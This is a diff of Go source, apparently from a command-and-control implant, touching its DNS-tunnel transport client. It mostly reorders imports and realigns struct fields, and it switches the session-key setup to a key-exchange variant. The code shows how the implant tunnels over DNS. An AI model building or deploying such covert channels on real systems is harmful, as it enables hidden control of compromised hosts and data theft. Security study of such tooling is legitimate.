@@ -6,9 +6,9 @@ import (
 	"encoding/base32"
 	"fmt"
 	"implant/core/app"
-	"implant/core/debuglog"
 	"implant/core/communication"
 	"implant/core/config"
+	"implant/core/debuglog"
 	"implant/core/encrypt"
 	"implant/core/reconnect"
 	"implant/core/utils"
@@ -19,18 +19,17 @@ import (
 	"github.com/miekg/dns"
 )
 
-
 // DNSClient 实现 communication.Transport（DNS 隧道轮询模型）。
 // config.Host = "DNSServer:53:tunnel.domain"（冒号分隔，与 listener 的 OSS 格式一致）。
 type DNSClient struct {
-	dnsServer    string
-	domain       string
-	clientID     string // 32 hex uid，作 DNS 查询标识（服务端 uid = BytesToMD5(metaInfo)）
-	reconnectMgr *reconnect.ReconnectManager
-	connected    bool
-	metaInfoB32  string      // base32(EncodeBase64(EncryptedMetaInfo))，仅 mi 注册分块用
-	client       *dns.Client // 复用的 DNS 客户端（无状态，可并发使用；避免每查询新建）
-	heartbeatOnce sync.Once  // 心跳 goroutine 仅启动一次（进程级，与连接无关）
+	dnsServer     string
+	domain        string
+	clientID      string // 32 hex uid，作 DNS 查询标识（服务端 uid = BytesToMD5(metaInfo)）
+	reconnectMgr  *reconnect.ReconnectManager
+	connected     bool
+	metaInfoB32   string      // base32(EncodeBase64(EncryptedMetaInfo))，仅 mi 注册分块用
+	client        *dns.Client // 复用的 DNS 客户端（无状态，可并发使用；避免每查询新建）
+	heartbeatOnce sync.Once   // 心跳 goroutine 仅启动一次（进程级，与连接无关）
 }
 
 // NewTransport 构造 DNS 传输（单二进制 build tag 入口）。
@@ -152,7 +151,7 @@ func (c *DNSClient) Connect(host string) error {
 
 	// 设置会话密钥
 	salt, masterKey := app.GetListenerKeyConfig("dns")
-	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
+	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
 		c.fail()
 		return err
 	}
